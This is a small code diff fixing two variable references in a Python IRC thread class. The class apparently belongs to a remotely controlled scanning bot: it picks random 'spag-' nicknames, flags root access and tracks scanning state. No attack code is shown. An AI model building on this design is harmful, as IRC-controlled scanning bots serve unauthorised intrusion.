@@ -324,14 +324,14 @@ class IRC(threading.Thread):
         self.channel   = channel
         self.key       = key
         self.nickname  = 'spag-xxxxx'
-        self.id        = nickname[-5:]
+        self.id        = self.nickname[-5:]
         self.sock      = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.scanning  = False
         self.stop_scan = False
         threading.Thread.__init__(self)
 
     def run(self):
-        self.nickname = 'spag-' + functions.random_str(5)
+        self.nickname = 'spag-' + random_str(5)
         if check_root() : self.nickname = 'r' + self.nickname
         self.connect()
 
